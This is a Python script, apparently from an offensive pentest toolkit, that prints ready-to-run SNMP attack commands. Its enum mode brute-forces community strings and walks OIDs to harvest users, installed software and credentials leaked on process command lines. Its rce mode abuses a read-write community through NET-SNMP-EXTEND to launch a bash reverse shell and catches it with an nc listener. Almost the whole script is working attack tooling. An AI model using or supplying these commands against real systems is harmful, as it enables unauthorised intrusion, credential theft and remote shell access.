#!/usr/bin/env python3
"""SNMP (161/udp) foothold via community strings. PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_snmp.py enum --target 10.0.0.5 [--community public]
  python3 gen_snmp.py rce  --target 10.0.0.5 --community private   # RW community -> NET-SNMP-EXTEND -> RCE
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "enum"
t   = opt("--target", "<target>")
c   = opt("--community", "public")

if arg == "enum":
    print(f"# 1) find a valid community string (brute the common ones):")
    print(f"# needs: SNMP reachable on 161/udp (UDP — no TCP connect confirms it).")
    print(f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {t}")
    print(f"#   -> ok: a line like '{t} [<community>]' = that community string is valid")
    print(f"# 2) enumerate everything (often leaks users, processes w/ cmdline creds, software, routes):")
    print(f"# needs: a valid READ community in <community> (default shown: {c}).")
    print(f"snmpwalk -v2c -c {c} {t}                          # full walk (big)")
    print(f"#   -> ok: OID lines stream back (not 'Timeout') = the community reads")
    print(f"snmp-check {t} -c {c}                             # parsed: users, processes, network, software")
    print(f"snmpwalk -v2c -c {c} {t} 1.3.6.1.4.1.77.1.2.25    # Windows local users")
    print(f"snmpwalk -v2c -c {c} {t} 1.3.6.1.2.1.25.4.2.1.4   # running processes + args (creds on cmdline!)")
    print(f"snmpwalk -v2c -c {c} {t} 1.3.6.1.2.1.25.6.3.1.2   # installed software")
    print(f"# -> creds found -> ../network/gen_shell.py.  A WRITE community (often 'private') -> rce.")

elif arg == "rce":
    print(f"# RW community + NET-SNMP-EXTEND -> execute a command (Linux net-snmp):")
    print(f"# needs: a READ-WRITE community in <community> (often 'private') + Linux net-snmp on the target.")
    print(f"# 1) register an 'extend' object that runs your command:")
    print(f"snmpset -v2c -c {c} {t} 'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"x\"' i 4 "
          f"'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"x\"' s /bin/bash "
          f"'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"x\"' s '-c \"{P.revshell_nq()}\"'")
    print(f"#   -> ok: the snmpset returns the value you set (no 'notWritable'/timeout) = the community is RW")
    print(f"# 2) trigger it by reading the output OID:")
    print(f"snmpwalk -v2c -c {c} {t} NET-SNMP-EXTEND-MIB::nsExtendObjects")
    print(f"#   -> ok: a connection lands on your listener = the extend object ran your command")
    print(f"# catch: nc -lvnp {P.LPORT}.   (Windows: RW community can rewrite config / no direct exec.)")
else:
    print("use: enum | rce"); sys.exit(1)
